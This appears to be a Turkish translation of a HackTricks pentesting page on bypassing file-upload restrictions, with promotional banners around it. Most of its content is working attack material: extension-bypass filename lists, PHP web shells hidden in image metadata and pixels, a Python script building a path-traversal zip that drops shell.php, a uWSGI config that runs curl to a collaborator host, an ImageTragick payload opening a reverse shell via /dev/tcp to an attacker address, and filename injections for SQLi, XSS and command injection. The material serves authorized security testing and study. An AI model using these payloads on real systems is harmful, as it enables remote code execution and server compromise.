# Dosya Yükleme

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **pull request** göndererek paylaşın.

</details>

![](<../../.gitbook/assets/image (638) (3).png>)

**Bug bounty ipucu**: **Hackerlar tarafından oluşturulan premium bir hata ödülü platformu olan** **Intigriti'ye kaydolun**! Bugün [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresinde bize katılın ve **$100,000**'e kadar ödüller kazanmaya başlayın!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Dosya Yükleme Genel Metodolojisi

Diğer kullanışlı uzantılar:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **PHPv8'de çalışma**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Sunucusu**: _.yaws_

### Uzantı kontrolünü atlatma

1. Eğer varsa, **önceki uzantıları kontrol edin**. Ayrıca, bazı **büyük harfli harfler** kullanarak test edin: _pHp, .pHP5, .PhAr ..._
2. _Çalıştırma uzantısından önce geçerli bir uzantı eklemeyi deneyin (önceki uzantıları da kullanın):_
* _file.png.php_
* _file.png.Php5_
3. **Sonuna özel karakterler eklemeyi** deneyin. Burp'u kullanarak tüm **ascii** ve **Unicode** karakterlerini **brute force** yapabilirsiniz. (_Önceki uzantıları da kullanmayı deneyebilirsiniz_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. **Uzantıyı iki katına çıkarmak** veya uzantılar arasına **gereksiz veri** (**null** baytları) ekleyerek sunucu tarafındaki **uzantı ayrıştırıcısını yanıltmayı** deneyin. _Daha iyi bir payload hazırlamak için **önceki uzantıları** de kullanabilirsiniz._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Önceki kontrol için **başka bir katman uzantısı** ekleyin:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. **Geçerli uzantıdan önce exec uzantısını** ekleyin ve sunucunun yanlış yapılandırılmış olmasını umun. (Apache yanlış yapılandırmalarını sömürmek için kullanışlıdır, burada uzantısı **.php** olan herhangi bir şey, ancak .php ile bitmeyen herhangi bir şey kodu çalıştıracaktır):
* _örn: file.php.png_
7. **Windows'ta NTFS alternatif veri akışı (ADS)** kullanın. Bu durumda, yasaklanmış bir uzantıdan önce ve izin verilen bir uzantıdan sonra bir iki nokta karakteri ":" eklenir. Sonuç olarak, sunucuda yasaklanmış uzantıya sahip bir **boş dosya** oluşturulur (örneğin "file.asax:.jpg"). Bu dosya daha sonra kısa dosya adını kullanarak düzenlenebilir. "**::$data**" deseni ayrıca boş olmayan dosyalar oluşturmak için kullanılabilir. Bu nedenle, bu desenin ardından bir nokta karakteri eklemek, daha fazla kısıtlamayı atlatmak için de kullanışlı olabilir (örneğin "file.asp::$data.")
8. Dosya adı sınırlarını kırmayı deneyin. Geçerli uzantı kesilir ve kötücül PHP bırakılır. AAA<--SNIP-->AAA.php

```
# Linux maksimum 255 bayt
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # burada 4 eksiltin ve .png ekleyin
# Dosyayı yükleyin ve yanıtı kontrol edin, kaç karakter izin verdiğini kontrol edin. Diyelim ki 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Payload'ı oluşturun
AAA<--SNIP 232 A-->AAA.php.png
```
### İçerik Türü, Sihirli Sayı, Sıkıştırma ve Yeniden Boyutlandırma Bypass Etme

* **İçerik Türü** kontrolünü aşmak için **Content-Type** **başlığının değerini** şu şekilde ayarlayın: _image/png_, _text/plain_, application/octet-stream_
1. İçerik Türü **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* **Sihirli sayı** kontrolünü aşmak için dosyanın başına **gerçek bir resim dosyasının baytlarını** ekleyin (_file_ komutunu yanıltmak için). Veya **meta veriye** kabuk ekleyin:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` veya payload'ı doğrudan bir resme **yerleştirebilirsiniz**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* Eğer resme **sıkıştırma ekleniyorsa**, örneğin [PHP-GD](https://www.php.net/manual/fr/book.image.php) gibi bazı standart PHP kütüphaneleri kullanılarak, önceki teknikler işe yaramaz. Bununla birlikte, **PLTE chunk** [**burada tanımlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanarak sıkıştırmayı **geçebilecek** bir metin ekleyebilirsiniz.
* [**Kodun bulunduğu Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Web sayfası ayrıca resmi **yeniden boyutlandırarak** da kullanabilir, örneğin PHP-GD fonksiyonları `imagecopyresized` veya `imagecopyresampled` kullanarak. Bununla birlikte, **IDAT chunk** [**burada tanımlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanarak sıkıştırmayı **geçebilecek** bir metin ekleyebilirsiniz.
* [**Kodun bulunduğu Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* Resmin **yeniden boyutlandırılmasını sağlamak için** başka bir teknik, PHP-GD fonksiyonu `thumbnailImage` kullanmaktır. Bununla birlikte, **tEXt chunk** [**burada tanımlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanarak sıkıştırmayı **geçebilecek** bir metin ekleyebilirsiniz.
* [**Kodun bulunduğu Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Diğer Kontrol Yöntemleri

* Dosyanın adını değiştirmek için bir zafiyet bulun (uzantıyı değiştirmek için).
* **Yerel Dosya Dahil Etme** zafiyeti bulun ve arka kapıyı çalıştırın.
* **Olası Bilgi Sızdırma**:
1. **Aynı dosyayı** **aynı isimle** **birkaç kez** (ve **aynı anda**) yükleyin.
2. **Zaten var olan bir dosya** veya **dizin** adıyla bir dosya yükleyin.
3. **“.”, “..”, veya “…”** adında bir dosya yükleyin. Örneğin, Apache'de **Windows** üzerinde, uygulama yüklenen dosyaları “/www/uploads/” dizininde saklıyorsa, “.” dosya adı “/www/” dizininde “uploads” adında bir dosya oluşturur.
4. **NTFS**'de **“…:.jpg”** gibi kolayca silinemeyen bir dosya yükleyin. (Windows)
5. İsminde `|<>*?”` gibi **geçersiz karakterler** bulunan bir dosya yükleyin. (Windows)
6. **Windows**'da CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 ve LPT9 gibi **yasaklanmış** (**yasak**) **isimler** kullanarak bir dosya yükleyin.
* Ayrıca, yanlışlıkla açıldığında kodu **çalıştıracak** bir **yürütülebilir** (.exe) veya **.html** (daha az şüpheli) dosya da **yüklemeyi deneyin**.

### Özel uzantı hileleri

Eğer dosyaları bir **PHP sunucusuna** yüklemeye çalışıyorsanız, [kodun çalıştırılması için **.htaccess** hilesine göz atın](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
Eğer dosyaları bir **ASP sunucusuna** yüklemeye çalışıyorsanız, [kodun çalıştırılması için **.config** hilesine göz atın](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` dosyaları, java için `.jar` gibi, ancak php için kullanılır ve bir php dosyası gibi **kullanılabilir** (php ile çalıştırarak veya bir betik içine dahil ederek...)

`.inc` uzantısı bazen sadece dosyaları **ithal etmek** için kullanılan php dosyaları için kullanılır, bu yüzden bir noktada, **bu uzantının çalıştırılmasına izin verilmiş** olabilir.

## **Jetty RCE**

Eğer bir Jetty sunucusuna bir XML dosyası yükleyebiliyorsanız, [RCE elde edebilirsiniz çünkü **yeni \*.xml ve \*.war otomatik olarak işlenir**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Bu nedenle, aşağıdaki resimde belirtildiği gibi XML dosyasını `$JETTY_BASE/webapps/` dizinine yükleyin ve kabuğu bekleyin!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

Bu zafiyetin ayrıntılı bir keşfi için orijinal araştırmaya bakın: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Uzaktan Komut Yürütme (RCE) zafiyetleri, birinin `.ini` yapılandırma dosyasını değiştirme yeteneği varsa uWSGI sunucularında istismar edilebilir. uWSGI yapılandırma dosyaları, "sihirli" değişkenler, yer tutucular ve operatörler içeren belirli bir sözdizimini kullanır. Özellikle, `@(filename)` olarak kullanılan '@' operatörü, bir dosyanın içeriğini dahil etmek için tasarlanmıştır. uWSGI'de desteklenen çeşitli şemalardan, "exec" şeması özellikle güçlüdür ve bir işlemin standart çıktısından veri okumayı sağlar. Bu özellik, `.ini` yapılandırma dosyası işlendiğinde Uzaktan Komut Yürütme veya Keyfi Dosya Yazma/Okuma gibi kötü amaçlı amaçlar için manipüle edilebilir.

Aşağıdaki zararlı `uwsgi.ini` dosyası örneği, çeşitli şemaları sergileyerek bu konuyu göstermektedir:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Payload'in yürütülmesi, yapılandırma dosyasının ayrıştırılması sırasında gerçekleşir. Yapılandırmanın etkinleştirilmesi ve ayrıştırılması için uWSGI işlemi yeniden başlatılmalıdır (olası bir çökme veya Hizmet Reddi saldırısı sonrasında) veya dosya otomatik yeniden yükleme olarak ayarlanmalıdır. Otomatik yeniden yükleme özelliği etkinleştirilmişse, değişiklikler algılandığında belirtilen aralıklarla dosya yeniden yüklenir.

uWSGI'nin yapılandırma dosyası ayrıştırmasının gevşek doğasını anlamak önemlidir. Özellikle, tartışılan payload bir ikili dosyaya (örneğin bir resim veya PDF) yerleştirilebilir, bu da potansiyel istismar alanını genişletir.

## **wget Dosya Yükleme/SSRF Hilesi**

Bazı durumlarda bir sunucunun **`wget`** kullanarak **dosyaları indirdiğini** ve **URL'yi** belirtebileceğinizi fark edebilirsiniz. Bu durumlarda, kodun indirilen dosyaların uzantısının bir beyaz listeye dahil olduğunu kontrol ettiğini ve yalnızca izin verilen dosyaların indirileceğini sağladığını görebilirsiniz. Bununla birlikte, **bu kontrol atlatılabilir.**\
**Linux**'ta bir **dosya adının** maksimum uzunluğu **255**'tir, ancak **wget** dosya adlarını **236** karaktere kısaltır. **"A"\*232+".php"+".gif"** adında bir dosya indirebilirsiniz, bu dosya adı **kontrolü atlayacak** (bu örnekte **".gif"** geçerli bir uzantıdır) ancak `wget` dosyayı **"A"\*232+".php"** olarak yeniden adlandıracaktır.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Bu kontrolü atlamak için düşünebileceğiniz **başka bir seçenek**, **HTTP sunucusunun farklı bir dosyaya yönlendirmesini sağlamaktır**, böylece başlangıçtaki URL, wget yeni adıyla yönlendirilen dosyayı indirecektir. Bu, wget'in **--trust-server-names** parametresiyle kullanıldığı **sürece çalışmayacaktır**, çünkü wget, yönlendirilen sayfayı orijinal URL'de belirtilen dosya adıyla indirecektir.


## Araçlar

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass), dosya yükleme mekanizmalarını test etmek için tasarlanmış güçlü bir araçtır. Web uygulamalarının kapsamlı bir şekilde değerlendirilmesini sağlayarak, zayıflıkların tespit edilmesi ve istismar edilmesi sürecini basitleştirmek için çeşitli hata avı tekniklerinden yararlanır.

## Dosya yüklemesinden diğer zayıflıklara

* **Dosya adını** `../../../tmp/lol.png` olarak ayarlayın ve **yol geçidi** elde etmeye çalışın
* **Dosya adını** `sleep(10)-- -.jpg` olarak ayarlayın ve **SQL enjeksiyonu** elde edebilirsiniz
* **Dosya adını** `<svg onload=alert(document.domain)>` olarak ayarlayarak XSS elde edin
* **Dosya adını** `; sleep 10;` olarak ayarlayarak bazı komut enjeksiyonlarını test edin (daha fazla [komut enjeksiyonu hileleri burada](../command-injection.md))
* [Resim (svg) dosyasında **XSS**](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** dosyası **yükleme** + **XSS** = [**Service Workers** istismarı](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [svg yüklemede **XXE**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [svg dosyası yükleyerek **Açık Yönlendirme**](../open-redirect.md#open-redirect-uploading-svg-files)
* [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet) adresinden **farklı svg payloadları** deneyin
* Ünlü **ImageTrick** zayıflığı [burada](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Web sunucusuna bir URL'den bir resmi yakalaması için işaretleyebilirseniz, [SSRF](../ssrf-server-side-request-forgery/)yi istismar etmeyi deneyebilirsiniz. Bu **resim**, bazı **genel** bir siteye **kaydedilecekse**, [https://iplogger.org/invisible/](https://iplogger.org/invisible/) adresinden bir URL belirtebilir ve her ziyaretçinin bilgilerini **çalabilirsiniz**.
* [PDF-Adobe yükleme ile **XXE ve CORS** atlatma](pdf-upload-xxe-and-cors-bypass.md)
* XSS için özel olarak oluşturulmuş PDF'ler: [Aşağıdaki sayfa, JS yürütme elde etmek için PDF verilerini enjekte etme](../xss-cross-site-scripting/pdf-injection.md) yöntemini göstermektedir. PDF'ler yükleyebiliyorsanız, verilen talimatlara uyarak keyfi JS yürüten bir PDF hazırlayabilirsiniz.
* Sunucunun herhangi bir **antivirüs** olup olmadığını kontrol etmek için \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) içeriğini yükleyin
* Dosya yükleme sırasında herhangi bir **boyut sınırı** olup olmadığını kontrol edin

İşte yükleyerek elde edebileceğiniz 10 şeyin bir listesi (buradan alınmıştır: [buradan](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Depolanmış XSS / SSRF / XXE
3. **GIF**: Depolanmış XSS / SSRF
4. **CSV**: CSV enjeksiyonu
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML enjeksiyonu / XSS / Açık yönlendirme
8. **PNG / JPEG**: Piksel sel saldırısı (DoS)
9. **ZIP**: LFI aracılığıyla RCE / DoS
10. **PDF / PPTX**: SSRF / KÖR XXE

#### Burp Uzantısı

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Sihirli Başlık Baytları

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Diğer dosya türleri için [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) adresine bakın.

### Otomatik olarak açılan Zip/Tar Dosyası Yükleme

Sunucu içinde açılacak bir ZIP yükleyebiliyorsanız, 2 şey yapabilirsiniz:

#### Sembolik bağlantı

Diğer dosyalara sembolik bağlantılar içeren bir bağlantı yükleyin, ardından açılan dosyalara erişerek bağlantılı dosyalara erişeceksiniz:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Farklı klasörlere açma

Açma işlemi sırasında dosyaların beklenmedik şekilde dizinlere oluşturulması önemli bir sorundur. İlk başta, bu yapılandırmanın kötü niyetli dosya yüklemeleri aracılığıyla işletim sistemi düzeyinde komut yürütme saldırılarına karşı koruma sağlayabileceği düşünülse de, ZIP arşiv formatının hiyerarşik sıkıştırma desteği ve dizin gezinme yetenekleri kötü niyetli kişiler tarafından istismar edilebilir. Bu, saldırganların hedef uygulamanın açma işlevselliğini manipüle ederek kısıtlamaları atlamasına ve güvenli yükleme dizinlerinden kaçmasına olanak tanır.

Bu tür dosyaları oluşturmak için otomatik bir saldırı aracı [**GitHub'da evilarc**](https://github.com/ptoomey3/evilarc) adresinde mevcuttur. Yardımcı program aşağıdaki gibi kullanılabilir:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Ayrıca, **evilarc ile sembolik bağlantı hilesi** bir seçenektir. Eğer hedef `/flag.txt` gibi bir dosyaysa, sistemde o dosyaya bir sembolik bağlantı oluşturulmalıdır. Bu, evilarc'ın işlemi sırasında hata ile karşılaşmamasını sağlar.

Aşağıda, kötü niyetli bir zip dosyası oluşturmak için kullanılan Python kodu örneği bulunmaktadır:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Dosyalama sıkıştırmasını kötüye kullanma**

Daha fazla ayrıntı için **orijinal yayına bakın**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)


1. **PHP Shell Oluşturma**:
Komutları `$_REQUEST` değişkeni üzerinden geçiren PHP kodu yazılır.
```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2. **Dosya Spreyi ve Sıkıştırılmış Dosya Oluşturma**:
Birden fazla dosya oluşturulur ve bu dosyaları içeren bir zip arşivi oluşturulur.
```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3. **Hex Düzenleyici veya vi ile Değiştirme**:
Zip içindeki dosyaların isimleri vi veya bir hex düzenleyici kullanılarak değiştirilir, "xxA" yerine dizinleri gezinmek için "../" olarak değiştirilir.
```bash
:set modifiable
:%s/xxA/..\//g
:x!
```


## ImageTragic

Bu içeriği bir resim uzantısıyla yükleyerek zafiyeti sömürün **(ImageMagick , 7.0.1-1)**
([sömürü](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG İçine PHP Shell Gömme

Bir PNG dosyasının IDAT parçasına bir PHP shell gömmek, belirli görüntü işleme işlemlerini etkili bir şekilde atlayabilir. PHP-GD'deki `imagecopyresized` ve `imagecopyresampled` işlevleri özellikle ilgili olup, genellikle resimleri yeniden boyutlandırma ve örnekleme için kullanılırlar. Gömülü PHP shell'in bu işlemlerden etkilenmemesi, belirli kullanım durumları için önemli bir avantajdır.

Bu teknik hakkında ayrıntılı bir keşif, yöntemi ve potansiyel uygulamaları da içeren aşağıdaki makalede sunulmaktadır: ["PNG IDAT Parçalarında Web Shell Kodlama"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Bu kaynak, sürecin ve sonuçlarının kapsamlı bir anlayışını sunar.

Daha fazla bilgi için: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Poliglot Dosyalar

Poliglot dosyalar, siber güvenlikte benzersiz bir araç olarak hizmet eder ve aynı anda birden fazla dosya formatında geçerli olabilen birer kameleon gibi davranır. İlginç bir örnek, hem bir GIF hem de bir RAR arşivi olarak işlev gören bir [GIFAR](https://en.wikipedia.org/wiki/Gifar)'dır. Bu tür dosyalar sadece bu eşleşmeyle sınırlı değildir; GIF ve JS veya PPT ve JS gibi kombinasyonlar da mümkündür.

Poliglot dosyaların temel faydası, dosyaları türlerine göre tarayan güvenlik önlemlerini atlatma yetenekleridir. Çeşitli uygulamalarda yaygın olarak kullanılan bir uygulama, potansiyel olarak zararlı formatların (örneğin JS, PHP veya Phar dosyaları) oluşturduğu riski azaltmak için yalnızca belirli dosya türlerine izin vermektir (örneğin JPEG, GIF veya DOC). Bununla birlikte, poliglotlar, birden fazla dosya türünün yapısal kriterlerine uyarak bu kısıtlamaları gizlice atlayabilirler.

Uyarlanabilirliklerine rağmen, poliglotlar bazı sınırlamalarla karşılaşabilir. Örneğin, bir poliglot aynı anda bir PHAR dosyasını (PHp ARchive) ve bir JPEG'i temsil edebilirken, yüklemenin başarısı platformun dosya uzantısı politikalarına bağlı olabilir. Eğer sistem izin verilen uzantılara sıkı bir şekilde uymak zorunda ise, poliglotun sadece yapısal çiftliği yeterli olmayabilir.

Daha fazla bilgi için: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Referanslar

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)


<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Hata ödülü ipucu**: **Intigriti'ye kaydolun**, **hackerlar tarafından oluşturulan premium bir hata ödülü platformuna**! Bugün [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresine katılın ve **100.000 $'a kadar** ödüller kazanmaya başlayın!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin!</summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklam vermek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da takip edin 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi paylaşmak için PR'lar göndererek [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
